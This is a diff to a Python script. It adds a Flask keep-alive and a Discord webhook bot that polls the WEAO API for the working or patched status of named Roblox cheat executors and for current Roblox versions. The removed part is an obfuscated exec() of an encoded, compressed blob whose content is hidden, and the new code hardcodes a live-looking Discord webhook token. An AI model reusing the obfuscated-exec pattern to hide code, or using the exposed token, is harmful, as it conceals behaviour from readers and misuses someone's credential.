@@ -1,2 +1,230 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+import time
+import requests
+from datetime import datetime, timezone
+import os
+from threading import Thread
+from flask import Flask
+
+# =======================================================
+# CONFIGURATION (ตั้งค่าตรงนี้)
+# =======================================================
+WEBHOOK_URL = "https://discord.com/api/webhooks/1514211987234488401/dT70YrRMx2yVHSfw_Cb6Opf6VqdY8W5nOw5RQSU-qNLoGHO7ZPM5JQsH3Pfj9ei_LgYO"   # <-- ใส่ webhook ใหม่ตรงนี้ (อย่าแชร์ออกไปอีก)
+EXPLOIT_API_URL = "https://weao.xyz/api/status/exploits"
+VERSION_API_URL = "https://weao.xyz/api/versions/current"
+CHECK_INTERVAL = 60          # แนะนำ >= 60 วิ กัน rate limit (429)
+FOOTER_TEXT = "Vereus X Status System"
+# =======================================================
+
+app = Flask('')
+
+@app.route('/')
+def home():
+    return "<h1>Vereus X Status System is Active!</h1>", 200
+
+def keep_alive():
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host='0.0.0.0', port=port)
+
+# ── รายชื่อตายตัวตามหมวดหมู่ที่กำหนด ──────────────────────────
+CATEGORY_LISTS = {
+    "Windows Script Executor Exploits": [
+        "Volt", "Potassium", "Wave", "Synapse Z", "Seliware",
+        "Madium", "Cosmic", "Velocity", "SirHurt", "Solara", "Xeno"
+    ],
+    "Mac Script Executor Exploits": [
+        "MacSploit", "Opiumware"
+    ],
+    "Android Script Executor Exploits": [
+        "Delta", "Vega X", "Codex"
+    ],
+    "iOS Script Executor Exploits": [
+        "Delta"
+    ],
+    "Windows External Exploits": [
+        "Serotonin", "Severe", "RbxCli", "Lumen", "Matcha",
+        "Matrix Hub", "Photon", "DX9WARE V2"
+    ],
+}
+
+# Platform ที่ใช้กรองคู่กับชื่อ กันชื่อซ้ำข้ามแพลตฟอร์ม (เช่น Delta มีทั้ง Android/iOS)
+CATEGORY_PLATFORM = {
+    "Windows Script Executor Exploits": "Windows",
+    "Mac Script Executor Exploits": "Mac",
+    "Android Script Executor Exploits": "Android",
+    "iOS Script Executor Exploits": "iOS",
+    "Windows External Exploits": "Windows",
+}
+
+# ── ดึงสถานะ exploit ──────────────────────────────────────────
+def fetch_exploit_data():
+    headers = {"User-Agent": "WEAO-3PService"}
+    try:
+        resp = requests.get(EXPLOIT_API_URL, headers=headers, timeout=15)
+        if resp.status_code == 429:
+            print(f"[{time.strftime('%X')}] โดน Rate Limit จาก WEAO Exploit API")
+            return "RATELIMIT", []
+        if resp.status_code != 200:
+            print(f"[{time.strftime('%X')}] WEAO Exploit API ตอบกลับ status {resp.status_code}")
+            return "OFFLINE", []
+        data = resp.json()
+        if isinstance(data, dict):
+            data = data.get("exploits") or data.get("data") or []
+        return "ONLINE", data
+    except Exception as e:
+        print(f"[{time.strftime('%X')}] บอทเกิดข้อผิดพลาดในการดึงข้อมูล: {e}")
+        return "OFFLINE", []
+
+# ── ดึงเวอร์ชัน Roblox ปัจจุบัน ─────────────────────────────────
+def fetch_roblox_versions():
+    headers = {"User-Agent": "WEAO-3PService"}
+    try:
+        resp = requests.get(VERSION_API_URL, headers=headers, timeout=15)
+        if resp.status_code != 200:
+            print(f"[{time.strftime('%X')}] WEAO Version API ตอบกลับ status {resp.status_code}")
+            return None
+        return resp.json()
+    except Exception as e:
+        print(f"[{time.strftime('%X')}] ดึงข้อมูล Roblox Version ผิดพลาด: {e}")
+        return None
+
+def get_status_text(ex):
+    """
+    สถานะมีแค่ 3 แบบ:
+    🟢 Working  -> updateStatus = True และไม่มี hasIssues
+    🟠 Issues   -> updateStatus = True แต่ hasIssues = True
+    🔴 Patched  -> updateStatus = False
+    """
+    update_ok  = ex.get("updateStatus", False)
+    has_issues = ex.get("hasIssues", False)
+
+    if not update_ok:
+        return "🔴 Patched"
+    if has_issues:
+        return "🟠 Issues"
+    return "🟢 Working"
+
+def categorize_executors(exploits):
+    categorized = {cat: [] for cat in CATEGORY_LISTS}
+    lookup = {}
+    for ex in exploits:
+        key = (ex.get("title", ""), ex.get("platform", ""))
+        lookup[key] = ex
+
+    for category, names in CATEGORY_LISTS.items():
+        platform = CATEGORY_PLATFORM[category]
+        for name in names:
+            ex = lookup.get((name, platform))
+            if ex:
+                status_str = get_status_text(ex)
+                categorized[category].append(f"**{name}** : {status_str}")
+            else:
+                categorized[category].append(f"**{name}** : ⚪ Not Found")
+
+    return categorized
+
+# ── สร้าง field หมวด Roblox Version ─────────────────────────────
+def build_version_field(versions):
+    if not versions:
+        value_text = "*Unable to fetch version data*"
+        return {"name": "🧩 Roblox Version Update Tracker", "value": value_text, "inline": False}
+
+    win_ver  = versions.get("Windows", "Unknown")
+    win_date = versions.get("WindowsDate", "")
+    mac_ver  = versions.get("Mac", "Unknown")
+    mac_date = versions.get("MacDate", "")
+    and_ver  = versions.get("Android", "Unknown")
+    and_date = versions.get("AndroidDate", "")
+    ios_ver  = versions.get("iOS", "Unknown")
+    ios_date = versions.get("iOSDate", "")
+
+    lines = [
+        f"**Roblox Windows** : `{win_ver}`\n└ Last Updated: {win_date}",
+        f"**Roblox Mac** : `{mac_ver}`\n└ Last Updated: {mac_date}",
+        f"**Roblox Android-iOS** : `Android {and_ver}` / `iOS {ios_ver}`\n└ Android: {and_date}\n└ iOS: {ios_date}",
+    ]
+    value_text = "\n\n".join(lines)
+
+    return {"name": "🧩 Roblox Version Update Tracker", "value": value_text, "inline": False}
+
+def build_embed(api_status, categories, versions):
+    fields = []
+
+    # ── หมวด Roblox Version ขึ้นก่อนเป็นอันดับแรก ──
+    fields.append(build_version_field(versions))
+
+    # ── หมวด Exploit ตามเดิม ──
+    for category, items in categories.items():
+        value_text = "\n".join(items) if items else "*No data in this category*"
+        if len(value_text) > 1024:
+            value_text = value_text[:1000] + "\n...(truncated)"
+        fields.append({"name": f"💻 {category}", "value": value_text, "inline": False})
+
+    if api_status == "ONLINE":
+        embed_color = 65280
+        status_label = "🟢 ONLINE"
+    elif api_status == "RATELIMIT":
+        embed_color = 16776960
+        status_label = "🟡 RATE LIMITED"
+    else:
+        embed_color = 16711680
+        status_label = "🔴 OFFLINE"
+
+    current_time_str = time.strftime('%X')
+
+    payload = {
+        "embeds": [
+            {
+                "title": "🛡️ WEAO Status by siw",
+                "description": (
+                    f"**🌐 WEBSITE WEAO STATUS:** {status_label}\n\n"
+                    f"🟢 Working = UPDATE  |  🟠 Issues = WAITING FIX  |  🔴 Patched = DOWN"
+                ),
+                "color": embed_color,
+                "fields": fields,
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+                "footer": {"text": f"{FOOTER_TEXT} | Last Updated: {current_time_str}"}
+            }
+        ]
+    }
+    return payload
+
+def monitor_loop():
+    message_id = None
+    webhook_url_with_wait = WEBHOOK_URL + ("" if "?wait=true" in WEBHOOK_URL else "?wait=true")
+    time.sleep(3)
+    print("=== ระบบดึงข้อมูล Exploit + Roblox Version จาก WEAO API เริ่มทำงาน ===")
+
+    while True:
+        api_status, exploits = fetch_exploit_data()
+        versions = fetch_roblox_versions()
+
+        categories = categorize_executors(exploits) if exploits else {cat: [] for cat in CATEGORY_LISTS}
+        payload = build_embed(api_status, categories, versions)
+
+        try:
+            if message_id is None:
+                response = requests.post(webhook_url_with_wait, json=payload)
+                if response.status_code in [200, 201]:
+                    message_id = response.json().get("id")
+                    print(f"[{time.strftime('%X')}] สร้างข้อความหลักสำเร็จ (ID: {message_id})")
+                else:
+                    print(f"[{time.strftime('%X')}] ส่ง Webhook ไม่สำเร็จ: {response.status_code} - {response.text}")
+            else:
+                clean_url = WEBHOOK_URL.split('?')[0]
+                edit_url = f"{clean_url}/messages/{message_id}"
+                response = requests.patch(edit_url, json=payload)
+                if response.status_code == 200:
+                    print(f"[{time.strftime('%X')}] อัปเดตสถานะเรียบร้อย ({api_status})")
+                elif response.status_code == 404:
+                    message_id = None
+                else:
+                    print(f"[{time.strftime('%X')}] แก้ไขข้อความไม่สำเร็จ: {response.status_code}")
+        except Exception as e:
+            print(f"Discord Webhook Error: {e}")
+
+        time.sleep(CHECK_INTERVAL)
+
+if __name__ == "__main__":
+    server_thread = Thread(target=keep_alive)
+    server_thread.start()
+    monitor_loop()
